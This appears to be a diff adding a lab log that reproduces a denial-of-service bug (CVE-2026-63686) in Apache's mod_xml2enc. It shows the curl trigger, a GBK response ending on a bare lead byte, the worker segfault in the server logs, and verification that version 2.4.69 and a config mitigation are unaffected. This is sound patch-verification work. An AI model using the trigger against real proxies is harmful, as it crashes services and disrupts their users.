@@ -1,0 +1,57 @@
+# Scenario 3 - CVE-2026-63686 : mod_xml2enc conversion-failure DoS
+# target: http://127.0.0.1:8080/proxy/   (2026-10-29 03:32 UTC)
+
+## Preconditions: proxy_html + xml2enc loaded, ProxyHTMLEnable On
+ xml2enc_module (shared)
+ proxy_html_module (shared)
+124:    ProxyHTMLEnable  On
+
+## Control: benign request through the proxy (expect 200, unaffected)
+control HTTP status: 200
+ACW3 backend
+
+## Trigger: declared charset=gbk, body ends on bare 0x81 (valid GBK lead byte, no trail byte, no further data)
+$ curl -v --max-time 10 "http://127.0.0.1:8080/proxy/scenario?charset=gbk&mode=incomplete-fail"
+client curl exit code: 18
+< Content-Type: text/html; charset=utf-8
+< Transfer-Encoding: chunked
+< 
+{ [115 bytes data]
+* transfer closed with outstanding read data remaining
+100   109    0   109    0     0   1973      0 --:--:-- --:--:-- --:--:--  1981
+* closing connection #0
+curl: (18) transfer closed with outstanding read data remaining
+
+## Server-side evidence (worker crash = DoS proof)
+acw3-target  | [Thu Oct 29 03:32:19.826586 2026] [xml2enc:info] [pid 18:tid 43] [client 172.30.0.1:55800] AH01431: Got charset gbk from HTTP headers
+acw3-target  | [Thu Oct 29 03:32:19.827762 2026] [xml2enc:error] [pid 18:tid 43] (70008)Partial results are valid but processing is incomplete: [client 172.30.0.1:55800] AH01445: Failed to convert input; trying it raw
+acw3-target  | [Thu Oct 29 03:32:20.570466 2026] [core:notice] [pid 1:tid 1] AH00052: child pid 18 exit signal Segmentation fault (11)
+
+segfault/AH00052 lines found: 1
+target still reachable after crash (new worker spawned): 200
+
+## Verdict
+  => CRASH REPRODUCED: Apache worker segfaulted processing a GBK-declared
+     response whose trailing byte is a valid-but-incomplete GBK lead byte
+     (iconv EINVAL, 'incomplete' per the upstream fix description).
+
+## Patched comparison (Apache 2.4.69, target-patched :8081)
+
+Hardened config (ProxyHTMLEnable Off): same gbk/incomplete-fail request returns
+the backend's raw bytes unchanged (Content-Type stays charset=gbk, no xml2enc
+log lines) - the filter chain never engages, so the vulnerable code path isn't
+reached at all. Reachable after: 200.
+
+Patch-only comparison (ProxyHTMLEnable temporarily flipped On to exercise the
+fixed mod_xml2enc code directly): same request gives a client-side
+"transfer closed with outstanding read data remaining" (curl exit 18), but
+`docker top acw3-target-patched` shows the IDENTICAL worker PIDs
+(58417/58418/58419) before and after the request - no worker died or was
+replaced. Target remained reachable (200) immediately after. This confirms
+2.4.69 handles the same input that segfaults 2.4.68 without crashing a worker;
+the client-side symptom is a benign side effect of the fix's raw-passthrough
+behavior, not a server-side failure.
+
+Verdict: CVE-2026-63686 does not reproduce on the patched target, by either
+the config-level mitigation (ProxyHTMLEnable Off) or the code fix itself
+(2.4.69 with the filter re-enabled).
